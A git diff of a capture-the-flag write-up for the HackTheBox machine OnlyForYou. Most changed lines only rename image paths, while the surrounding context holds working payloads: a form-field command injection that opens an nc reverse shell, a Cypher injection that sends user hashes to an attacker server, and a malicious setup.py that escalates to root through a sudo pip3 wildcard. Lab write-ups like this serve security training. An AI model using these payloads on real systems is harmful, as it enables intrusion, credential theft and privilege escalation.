@@ -21,15 +21,15 @@ Web Exploit for RCE it seems. We have to add `only4you.htb` to our `/etc/hosts` 
 
 Port 80 is hosting a corporate website.
 
-![](<../../.gitbook/assets/image%20(3094).png>)
+![](../../.gitbook/assets/onlyforyou-8.png)
 
 At the very bottom, it seems that we can download a trial of their application. This redirects us to the `beta.only4you.htb` domain.
 
-![](<../../.gitbook/assets/image%20(3336).png>)
+![](../../.gitbook/assets/onlyforyou-11.png)
 
 The subdomain shows us this site where we can view source code.
 
-![](<../../.gitbook/assets/image%20(3283).png>)
+![](../../.gitbook/assets/onlyforyou-9.png)
 
 I'm assuming that this is the source code for the Resizer and Converter application that is present in the corner. When we download the source code, there is an `app.py` and `tool.py` file that we have to analyse.
 
@@ -216,7 +216,7 @@ Upgrade-Insecure-Requests: 1
 name=test&email=test%40website.com+|+rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.14.5+4444+>/tmp/f&subject=test&message=test
 ```
 
-![](<../../.gitbook/assets/image%20(1583).png>)
+![](../../.gitbook/assets/onlyforyou-3.png)
 
 ## Privilege Escalation
 
@@ -270,19 +270,19 @@ Trying to use `proxychains` with Firefox didn't really work for some reason, so 
 
 Port 8001 was another login page:
 
-![](<../../.gitbook/assets/image%20(1847).png>)
+![](../../.gitbook/assets/onlyforyou-6.png)
 
 I tried some weak credentials, and found that `admin:admin` worked. This was some sort of dashboard with sales and stuff.
 
-![](<../../.gitbook/assets/image%20(3299).png>)
+![](../../.gitbook/assets/onlyforyou-10.png)
 
 Within the Employees tab, we can search for the names of employees.
 
-![](<../../.gitbook/assets/image%20(960).png>)
+![](../../.gitbook/assets/onlyforyou-14.png)
 
 There's the port for `neo4j` open on the machine, so I assumed that some kind of query injection was next. Also, we can see the Tasks on the main dashboard page to verify this.
 
-![](<../../.gitbook/assets/image%20(669).png>)
+![](../../.gitbook/assets/onlyforyou-13.png)
 
 As usual, Hacktricks has a whole page to get us started.
 
@@ -313,11 +313,11 @@ Great! We have confirmed that we have injection. Now, we can try to extract hash
 ' OR 1=1 WITH 1 as a MATCH (f:user) UNWIND keys(f) as p LOAD CSV FROM 'http://10.10.14.5:5000/?' + p +'='+toString(f[p]) as l RETURN 0 as _0 //
 ```
 
-![](<../../.gitbook/assets/image%20(1653).png>)
+![](../../.gitbook/assets/onlyforyou-4.png)
 
 We can crack these hashes on CrackStation.
 
-![](<../../.gitbook/assets/image%20(1273).png>)
+![](../../.gitbook/assets/onlyforyou-1.png)
 
 With this password, we can `ssh` in as `john`! Then, we can grab the user flag.
 
@@ -337,11 +337,11 @@ User john may run the following commands on only4you:
 
 Obviously, there's a wildcard here and it is vulnerable. Now, this was using port 3000, and we should try to port forward that. Doing so would reveal that port 3000 is running a Gogs server.
 
-![](<../../.gitbook/assets/image%20(1982).png>)
+![](../../.gitbook/assets/onlyforyou-7.png)
 
 Checking the repository, we can see that `john` is a user on the service. We can reuse the password we found earlier to login. Afterwards, we can create repositories on this.
 
-![](<../../.gitbook/assets/image%20(1412).png>)
+![](../../.gitbook/assets/onlyforyou-2.png)
 
 Since this exploit involved using `pip3 download`, we can search for exploits regarding that. Here's a good resource I found:
 
@@ -353,10 +353,10 @@ The exploit details how we have to create a malicious repository on this Gogs in
 
 I just modifed the `setup.py` file to run `os.system("chmod u+s /bin/bash")`. Afterwards, we need to build the package using `python3 -m build`. Afterwards, we need to upload the file. I created a new repository on the Gogs instance and uploaded it there.
 
-![](<../../.gitbook/assets/image%20(1711).png>)
+![](../../.gitbook/assets/onlyforyou-5.png)
 
 Then, we can just run the command to download it.
 
-![](<../../.gitbook/assets/image%20(3785).png>)
+![](../../.gitbook/assets/onlyforyou-12.png)
 
 We can easily get a root shell at this point.
